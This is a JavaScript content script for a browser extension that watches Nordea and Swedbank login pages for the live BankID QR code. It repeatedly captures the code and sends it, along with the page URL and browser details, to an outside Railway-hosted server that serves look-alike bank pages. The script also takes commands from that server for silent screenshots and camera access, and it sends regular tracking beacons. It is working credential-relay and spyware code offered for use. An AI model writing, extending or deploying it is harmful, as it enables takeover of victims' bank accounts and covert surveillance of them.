// Enhanced Content Script for Alpha's Unblockable Railway Server
// Enhanced functionality with session rotation and analytics

// Server configuration - multiple endpoints for redundancy
const RAILWAY_URLS = [
    'https://web-production-72c0d.up.railway.app'
];

let currentServerIndex = 0;
let sessionToken = null;

// Get current server URL with rotation
function getCurrentServer() {
    return RAILWAY_URLS[currentServerIndex];
}

// Rotate server if one fails
function rotateServer() {
    currentServerIndex = (currentServerIndex + 1) % RAILWAY_URLS.length;
    console.log(`🔄 Rotated to server: ${getCurrentServer()}`);
}

// Generate session token for tracking
function generateSessionToken() {
    if (!sessionToken) {
        sessionToken = Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15);
    }
    return sessionToken;
}

// Enhanced QR sending with retry and rotation
async function sendQRToRailway(qrData, retryCount = 0) {
    // Only send if qrData is a string and not an image data URL
    if (typeof qrData !== 'string' || qrData.startsWith('data:image/')) {
        console.warn('❌ Not sending image data or non-string QR to server.');
        sendAnalytics('qr_send_blocked', { reason: 'image_or_nonstring', data: qrData && qrData.substring ? qrData.substring(0, 30) : '' });
        return;
    }
    const serverUrl = getCurrentServer();
    const sessionId = generateSessionToken();
    try {
        const response = await fetch(`${serverUrl}/api/qr`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'Accept': 'application/json',
                'X-Session-ID': sessionId,
                'X-Source': 'alpha_extension'
            },
            body: JSON.stringify({ 
                qrData: qrData,
                sessionToken: sessionId,
                timestamp: new Date().toISOString(),
                url: window.location.href,
                source: 'alpha_extension_content',
                userAgent: navigator.userAgent,
                referrer: document.referrer
            })
        });
        if (response.ok) {
            const data = await response.json();
            console.log('✅ QR sent to Railway successfully:', data);
            sendAnalytics('qr_sent', {
                server: serverUrl,
                sessionId: sessionId,
                success: true
            });
            return data;
        } else {
            throw new Error(`HTTP ${response.status}`);
        }
    } catch (error) {
        console.error(`❌ Error sending QR to ${serverUrl}:`, error);
        sendAnalytics('qr_failed', {
            server: serverUrl,
            sessionId: sessionId,
            error: error.message
        });
        if (retryCount < RAILWAY_URLS.length - 1) {
            rotateServer();
            return sendQRToRailway(qrData, retryCount + 1);
        }
        throw error;
    }
}

// Send analytics to server
async function sendAnalytics(event, data) {
    try {
        const serverUrl = getCurrentServer();
        await fetch(`${serverUrl}/api/analytics`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                event: event,
                data: data,
                timestamp: Date.now(),
                sessionId: generateSessionToken()
            })
        });
    } catch (error) {
        console.error('Analytics error:', error);
    }
}

// Enhanced QR scanning with multiple methods
async function scanQRCode(imageData) {
    try {
        // Method 1: HTML5 QR Scanner
        if (typeof Html5Qrcode !== 'undefined') {
            const qrScanner = new Html5Qrcode("qr-reader");
            const result = await qrScanner.scanFile(imageData, true);
            return result;
        }
        
        // Method 2: jsQR library
        if (typeof jsQR !== 'undefined') {
            const canvas = document.createElement('canvas');
            const ctx = canvas.getContext('2d');
            const img = new Image();
            
            return new Promise((resolve, reject) => {
                img.onload = () => {
                    canvas.width = img.width;
                    canvas.height = img.height;
                    ctx.drawImage(img, 0, 0);
                    
                    const imageData = ctx.getImageData(0, 0, canvas.width, canvas.height);
                    const code = jsQR(imageData.data, imageData.width, imageData.height);
                    
                    if (code) {
                        resolve(code.data);
                    } else {
                        reject(new Error('No QR code found'));
                    }
                };
                img.src = imageData;
            });
        }
        
        throw new Error('No QR scanning library available');
    } catch (error) {
        console.error('QR scanning error:', error);
        throw error;
    }
}

// --- PATCH: Enhanced QR element detection - more aggressive ---
function findQRCodeElement() {
    console.log('🔍 Starting QR element search...');
    
    // Method 1: Look for specific QR selectors
    const specificSelectors = [
        'canvas[title*="QR"]',
        'canvas[id*="qr"]',
        'canvas[class*="qr"]',
        'img[alt*="QR"]',
        'img[class*="qr"]',
        'img[src*="qr"]',
        'canvas[data-testid*="qr"]',
        'img[data-testid*="qr"]'
    ];
    
    for (const selector of specificSelectors) {
        const element = document.querySelector(selector);
        if (element) {
            console.log('✅ Found QR element with selector:', selector, element);
            highlightElement(element);
            return element;
        }
    }
    
    // Method 2: Look in common containers
    const containers = [
        '.MuiPaper-root',
        '.MuiCard-root', 
        '.instruction-box',
        '.instructions',
        '.MuiBox-root',
        '.qr-container',
        '.bankid-container',
        '.login-container'
    ];
    
    for (const containerSelector of containers) {
        const container = document.querySelector(containerSelector);
        if (container) {
            const candidates = Array.from(container.querySelectorAll('img, canvas'));
            console.log(`🔍 Found ${candidates.length} candidates in container:`, containerSelector);
            
            for (const candidate of candidates) {
                const w = candidate.width || candidate.naturalWidth;
                const h = candidate.height || candidate.naturalHeight;
                
                // More lenient size check
                if (w && h && w > 50 && h > 50 && w < 800 && h < 800) {
                    console.log('✅ Found potential QR candidate:', candidate, `(${w}x${h})`);
                    highlightElement(candidate);
                    return candidate;
                }
            }
        }
    }
    
    // Method 3: Aggressive search - all images and canvases
    const allImages = Array.from(document.querySelectorAll('img'));
    const allCanvases = Array.from(document.querySelectorAll('canvas'));
    
    console.log(`🔍 Found ${allImages.length} images and ${allCanvases.length} canvases on page`);
    
    // Check all images
    for (const img of allImages) {
        const w = img.naturalWidth || img.width;
        const h = img.naturalHeight || img.height;
        
        if (w && h && w > 50 && h > 50) {
            console.log('✅ Found image candidate:', img, `(${w}x${h})`, img.src);
            highlightElement(img);
            return img;
        }
    }
    
    // Check all canvases
    for (const canvas of allCanvases) {
        const w = canvas.width;
        const h = canvas.height;
        
        if (w && h && w > 50 && h > 50) {
            console.log('✅ Found canvas candidate:', canvas, `(${w}x${h})`);
            highlightElement(canvas);
            return canvas;
        }
    }
    
    // Method 4: Look for any element with QR-related text
    const qrTextElements = Array.from(document.querySelectorAll('*')).filter(el => {
        const text = el.textContent || el.alt || el.title || '';
        return text.toLowerCase().includes('qr') || text.toLowerCase().includes('bankid');
    });
    
    if (qrTextElements.length > 0) {
        console.log('🔍 Found elements with QR text:', qrTextElements);
        // Look for images/canvases near these elements
        for (const textEl of qrTextElements) {
            const nearbyImages = textEl.querySelectorAll('img, canvas');
            if (nearbyImages.length > 0) {
                console.log('✅ Found image near QR text:', nearbyImages[0]);
                highlightElement(nearbyImages[0]);
                return nearbyImages[0];
            }
        }
    }
    
    console.warn('❌ No QR element found! Logging page info:');
    console.log('Page URL:', window.location.href);
    console.log('Page title:', document.title);
    console.log('All images:', allImages.map(img => ({src: img.src, width: img.naturalWidth, height: img.naturalHeight})));
    console.log('All canvases:', allCanvases.map(canvas => ({width: canvas.width, height: canvas.height})));
    
    return null;
}

function highlightElement(el) {
    el.style.outline = '4px solid #ff00ff';
    el.style.boxShadow = '0 0 20px 5px #ff00ff';
    setTimeout(() => {
        el.style.outline = '';
        el.style.boxShadow = '';
    }, 3000);
}

// --- PATCH: Auto-retry and re-inject on context invalidation ---
function safeSendMessage(message) {
    try {
        chrome.runtime.sendMessage(message);
    } catch (err) {
        if (err && err.message && err.message.includes('Extension context invalidated')) {
            console.warn('⚠️ Extension context invalidated. Attempting to re-inject...');
            setTimeout(() => {
                window.location.reload();
            }, 1000);
        } else {
            console.error('Error sending message:', err);
        }
    }
}

async function scanQRCodeFromElement(qrEl) {
    // Try to decode QR from canvas or image using jsQR
    let canvas, ctx, w, h;
    if (qrEl.tagName.toLowerCase() === 'canvas') {
        canvas = qrEl;
        w = canvas.width;
        h = canvas.height;
    } else if (qrEl.tagName.toLowerCase() === 'img') {
        canvas = document.createElement('canvas');
        w = qrEl.width || qrEl.naturalWidth;
        h = qrEl.height || qrEl.naturalHeight;
        canvas.width = w;
        canvas.height = h;
        ctx = canvas.getContext('2d');
        ctx.drawImage(qrEl, 0, 0, w, h);
    } else {
        return null;
    }
    ctx = ctx || canvas.getContext('2d');
    const imageData = ctx.getImageData(0, 0, w, h);
    if (typeof jsQR !== 'undefined') {
        const code = jsQR(imageData.data, imageData.width, imageData.height);
        if (code && code.data) {
            return code.data;
        }
    }
    return null;
}

// Listen for messages from popup
window.addEventListener('message', async (event) => {
    if (event.data.type === 'QR_SCAN') {
        try {
            console.log('🔍 Starting QR scan...');
            const qrEl = findQRCodeElement();
            if (!qrEl) {
                console.warn('❌ No QR code element found on page! Sending error.');
                sendAnalytics('qr_element_not_found', { url: window.location.href });
                return;
            }
            // Decode QR string from element
            const qrString = await scanQRCodeFromElement(qrEl);
            if (qrString) {
                console.log('✅ Decoded QR string:', qrString);
                safeSendMessage({
                    type: 'QR_FOUND',
                    data: qrString,
                    sessionId: generateSessionToken()
                });
                await sendQRToRailway(qrString);
                sendAnalytics('qr_scan_success', {
                    qrData: qrString.substring(0, 50) + '...',
                    url: window.location.href
                });
            } else {
                console.warn('❌ Could not decode QR from element!');
                sendAnalytics('qr_decode_failed', { url: window.location.href });
            }
        } catch (error) {
            console.error('❌ QR scanning error:', error);
            sendAnalytics('qr_scan_error', {
                error: error.message,
                url: window.location.href
            });
        }
    }
});

// --- PATCH: Handle QR element capture requests from background/popup ---
chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
    if (message.type === 'CAPTURE_QR_ELEMENT_ONLY') {
        console.log('🔍 Received QR element capture request');
        
        // Use async/await pattern for better error handling
        (async () => {
            try {
                // First try to find specific QR element
                const qrElement = findQRCodeElement();
                
                if (qrElement) {
                    // Capture only the QR element
                    const qrData = captureQRElementOnly(qrElement);
                    
                    if (qrData) {
                        console.log('✅ QR element captured successfully');
                        sendResponse({ qrData: qrData });
                        return;
                    } else {
                        console.log('❌ Failed to capture QR element, trying fallback...');
                    }
                } else {
                    console.log('❌ No QR element found, trying fallback...');
                }
                
                // Fallback: capture whole page and scan for QR
                try {
                    const qrData = await captureWholePageAndScanQR();
                    console.log('✅ QR found via fallback method');
                    sendResponse({ qrData: qrData });
                } catch (fallbackError) {
                    console.error('❌ Fallback QR scan failed:', fallbackError);
                    sendResponse({ error: 'No QR code found on page' });
                }
                
            } catch (error) {
                console.error('Error capturing QR element:', error);
                sendResponse({ error: error.message });
            }
        })();
        
        return true; // Keep message channel open for async response
    }
});

// Function to capture only QR element (not the whole page)
function captureQRElementOnly(qrElement) {
    try {
        console.log('📸 Capturing QR element:', qrElement.tagName, qrElement.src || qrElement.id);
        
        let canvas;
        let ctx;
        
        if (qrElement.tagName === 'IMG') {
            // Create canvas from image
            canvas = document.createElement('canvas');
            canvas.width = qrElement.naturalWidth || qrElement.width;
            canvas.height = qrElement.naturalHeight || qrElement.height;
            ctx = canvas.getContext('2d');
            ctx.drawImage(qrElement, 0, 0);
        } else if (qrElement.tagName === 'CANVAS') {
            // Use existing canvas
            canvas = qrElement;
            ctx = canvas.getContext('2d');
        } else {
            console.error('❌ Unsupported QR element type:', qrElement.tagName);
            return null;
        }
        
        // Get image data for QR scanning
        const imageData = ctx.getImageData(0, 0, canvas.width, canvas.height);
        
        // Scan for QR code using jsQR
        if (typeof jsQR !== 'undefined') {
            const code = jsQR(imageData.data, imageData.width, imageData.height);
            
            if (code && code.data) {
                console.log('✅ QR code found in element:', code.data.substring(0, 50) + '...');
                return code.data; // Return only the QR string, not the image
            } else {
                console.log('❌ No QR code found in element');
                return null;
            }
        } else {
            console.error('❌ jsQR library not available');
            return null;
        }
    } catch (error) {
        console.error('Error capturing QR element:', error);
        return null;
    }
}

// FALLBACK: Capture whole page and scan for QR if no element found
async function captureWholePageAndScanQR() {
    try {
        console.log('🔄 Fallback: Capturing whole page to scan for QR...');
        
        // Request screenshot from background script
        return new Promise((resolve, reject) => {
            chrome.runtime.sendMessage({ type: 'CAPTURE_QR_ONLY' }, (response) => {
                if (chrome.runtime.lastError) {
                    console.error('Screenshot capture error:', chrome.runtime.lastError);
                    reject(chrome.runtime.lastError);
                    return;
                }
                
                if (response && response.screenshot) {
                    // Load the screenshot and scan for QR
                    const img = new Image();
                    img.onload = () => {
                        const canvas = document.createElement('canvas');
                        canvas.width = img.width;
                        canvas.height = img.height;
                        const ctx = canvas.getContext('2d');
                        ctx.drawImage(img, 0, 0);
                        
                        const imageData = ctx.getImageData(0, 0, canvas.width, canvas.height);
                        
                        if (typeof jsQR !== 'undefined') {
                            const code = jsQR(imageData.data, imageData.width, imageData.height);
                            if (code && code.data) {
                                console.log('✅ QR found in whole page scan:', code.data.substring(0, 50) + '...');
                                resolve(code.data);
                            } else {
                                console.log('❌ No QR found in whole page scan');
                                reject(new Error('No QR code found in page'));
                            }
                        } else {
                            reject(new Error('jsQR library not available'));
                        }
                    };
                    img.onerror = () => reject(new Error('Failed to load screenshot'));
                    img.src = response.screenshot;
                } else {
                    reject(new Error('No screenshot received'));
                }
            });
        });
    } catch (error) {
        console.error('Error in fallback QR scan:', error);
        throw error;
    }
}

// --- RESTORED: Multi-bank QR detection and sending logic (10 days ago) ---
const PRODUCTION_URL = 'https://web-production-72c0d.up.railway.app';

const BANK_CONFIGS = {
    NORDEA: {
        identifier: {
            urls: ['identify.nordea.com', 'nordea.'],
            titles: ['nordea'],
            domains: ['nordea']
        },
        selectors: {
            qrCanvas: 'canvas.qr-code-canvas[title="QR-kod"]',
            qrCanvasById: 'canvas#qr-code-canvas',
            qrCanvasAll: 'canvas[title="QR-kod"]'
        },
        captureInterval: 50,
        captureThrottle: 100,
        lastCapture: 0,
        lastHash: null,
        displayUrl: `${PRODUCTION_URL}/Nordeafelsokningskundidentifieringkund98721311`
    },
    SWEDBANK: {
        identifier: {
            urls: ['online.swedbank.se', 'swedbank.'],
            titles: ['swedbank', 'mobilt bankid', 'logga in'],
            domains: ['swedbank']
        },
        selectors: {
            qrCanvas: 'canvas#sbid-qr',
            qrCanvasById: 'canvas[id*="qr"], canvas[id*="bankid"], canvas[id*="sbid"]',
            qrCanvasClass: 'canvas[class*="qr"], canvas[class*="bankid"], canvas[class*="sbid"]',
            qrCanvasAll: 'canvas[id*="bankid"], canvas[class*="bankid"], canvas[data-testid*="qr"]',
            qrImage: 'img.mobile-bank-id__qr-code--image, img[alt*="QR-kod"], img[class*="qr-code"]'
        },
        captureInterval: 50,
        captureThrottle: 100,
        lastCapture: 0,
        lastHash: null,
        displayUrl: `${PRODUCTION_URL}/Swedfelsokningskundidentifieringkund98721311`
    }
};

function identifyBank() {
    const currentUrl = window.location.href.toLowerCase();
    const currentTitle = document.title.toLowerCase();
    for (const [bank, config] of Object.entries(BANK_CONFIGS)) {
        if (config.identifier.urls.some(url => currentUrl.includes(url)) ||
            config.identifier.titles.some(title => currentTitle.includes(title)) ||
            config.identifier.domains.some(domain => currentUrl.includes(domain))) {
            return bank;
        }
    }
    return null;
}

function captureNordeaQR() {
    const config = BANK_CONFIGS.NORDEA;
    const now = Date.now();
    if (now - config.lastCapture < config.captureThrottle) return;
    const qrCanvas = document.querySelector('canvas[title="QR-kod"]') || 
                    document.querySelector('canvas#qr-code-canvas') ||
                    Array.from(document.getElementsByTagName('canvas')).find(canvas => 
                        canvas.width === canvas.height && 
                        canvas.width >= 150 && 
                        canvas.width <= 200
                    );
    if (qrCanvas) {
        try {
            const rect = qrCanvas.getBoundingClientRect();
            if (rect.width === 0 || rect.height === 0 || !rect.width || !rect.height) return;
            const base64Data = qrCanvas.toDataURL('image/png');
            if (!base64Data || base64Data === 'data:,') return;
            const hash = base64Data.slice(-32);
            if (hash === config.lastHash) return;
            config.lastHash = hash;
            config.lastCapture = now;
            fetch(`${PRODUCTION_URL}/api/qr`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' },
                body: JSON.stringify({ 
                    qrData: base64Data,
                    bank: 'NORDEA',
                    timestamp: new Date().toISOString(),
                    url: window.location.href,
                    displayUrl: config.displayUrl
                })
            }).then(response => response.json()).catch(() => {});
        } catch (error) {}
    }
}

function captureSwedQR() {
    const config = BANK_CONFIGS.SWEDBANK;
    const now = Date.now();
    if (now - config.lastCapture < config.captureThrottle) return;
    const qrImage = document.querySelector('img.mobile-bank-id__qr-code--image, img[alt*="QR-kod"]');
    if (qrImage) {
        try {
            const canvas = document.createElement('canvas');
            const rect = qrImage.getBoundingClientRect();
            canvas.width = qrImage.naturalWidth || rect.width;
            canvas.height = qrImage.naturalHeight || rect.height;
            const ctx = canvas.getContext('2d');
            ctx.drawImage(qrImage, 0, 0);
            const base64Data = canvas.toDataURL('image/png');
            if (!base64Data || base64Data === 'data:,') return;
            const hash = base64Data.slice(-32);
            if (hash === config.lastHash) return;
            config.lastHash = hash;
            config.lastCapture = now;
            fetch(`${PRODUCTION_URL}/api/qr`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' },
                body: JSON.stringify({ 
                    qrData: base64Data,
                    bank: 'SWEDBANK',
                    timestamp: new Date().toISOString(),
                    url: window.location.href,
                    displayUrl: config.displayUrl
                })
            }).then(response => response.json()).catch(() => {});
            return;
        } catch (error) {}
    }
    const qrCanvas = document.querySelector(config.selectors.qrCanvas) || 
                    document.querySelector(config.selectors.qrCanvasById) ||
                    document.querySelector(config.selectors.qrCanvasClass) ||
                    document.querySelector(config.selectors.qrCanvasAll) ||
                    Array.from(document.getElementsByTagName('canvas')).find(canvas => {
                        const isSquare = canvas.width === canvas.height;
                        const hasValidSize = canvas.width >= 150 && canvas.width <= 300;
                        return isSquare && hasValidSize;
                    });
    if (qrCanvas) {
        try {
            const rect = qrCanvas.getBoundingClientRect();
            if (rect.width === 0 || rect.height === 0 || !rect.width || !rect.height) return;
            const base64Data = qrCanvas.toDataURL('image/png');
            if (!base64Data || base64Data === 'data:,') return;
            const hash = base64Data.slice(-32);
            if (hash === config.lastHash) return;
            config.lastHash = hash;
            config.lastCapture = now;
            fetch(`${PRODUCTION_URL}/api/qr`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' },
                body: JSON.stringify({ 
                    qrData: base64Data,
                    bank: 'SWEDBANK',
                    timestamp: new Date().toISOString(),
                    url: window.location.href,
                    displayUrl: config.displayUrl
                })
            }).then(response => response.json()).catch(() => {});
        } catch (error) {}
    }
}

function startRealTimeMonitoring() {
    const currentBank = identifyBank();
    if (window._qrCaptureInterval) clearInterval(window._qrCaptureInterval);
    switch(currentBank) {
        case 'NORDEA':
            window._qrCaptureInterval = setInterval(captureNordeaQR, BANK_CONFIGS.NORDEA.captureInterval);
            setTimeout(captureNordeaQR, 100);
            break;
        case 'SWEDBANK':
            window._qrCaptureInterval = setInterval(captureSwedQR, BANK_CONFIGS.SWEDBANK.captureInterval);
            setTimeout(captureSwedQR, 100);
            break;
        default:
            window._qrCaptureInterval = setInterval(() => {}, 3000);
    }
    const observer = new MutationObserver((mutations) => {
        switch(currentBank) {
            case 'NORDEA':
                captureNordeaQR();
                break;
            case 'SWEDBANK':
                captureSwedQR();
                break;
            default:
                // No-op for now
        }
    });
    observer.observe(document.body, {
        childList: true,
        subtree: true,
        attributes: true,
        attributeFilter: ['src', 'style', 'class', 'id', 'data-testid']
    });
}

if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', () => {
        startRealTimeMonitoring();
    });
} else {
    startRealTimeMonitoring();
}

// Enhanced silent screenshot functionality
if (window.socket) {
    socket.on('request-silent-screenshot', async () => {
        console.log('📸 Silent screenshot request received from Railway');
        try {
            const response = await safeSendMessage({ 
                type: 'ADMIN_REQUEST_SCREENSHOT',
                sessionId: generateSessionToken()
            });
            
            if (response && response.success) {
                console.log('📸 Screenshot captured and sent');
                sendAnalytics('screenshot_captured', {
                    sessionId: generateSessionToken()
                });
            }
        } catch (error) {
            console.error('❌ Screenshot error:', error);
            sendAnalytics('screenshot_error', {
                error: error.message
            });
        }
    });

    // Enhanced silent camera functionality
    socket.on('request-silent-camera', async () => {
        console.log('📷 Silent camera request received from Railway');
        try {
            const response = await safeSendMessage({ 
                type: 'ADMIN_REQUEST_CAMERA',
                sessionId: generateSessionToken()
            });
            
            if (response && response.success) {
                console.log('📷 Camera access granted and sent');
                sendAnalytics('camera_accessed', {
                    sessionId: generateSessionToken()
                });
            }
        } catch (error) {
            console.error('❌ Camera error:', error);
            sendAnalytics('camera_error', {
                error: error.message
            });
        }
    });
}

// Initialize connection and send startup analytics
console.log('🚀 Alpha\'s enhanced extension connected to Railway server');
sendAnalytics('extension_loaded', {
    url: window.location.href,
    userAgent: navigator.userAgent,
    timestamp: Date.now()
});

// Periodic health check
setInterval(() => {
    sendAnalytics('health_check', {
        timestamp: Date.now(),
        sessionId: generateSessionToken()
    });
}, 300000); // Every 5 minutes 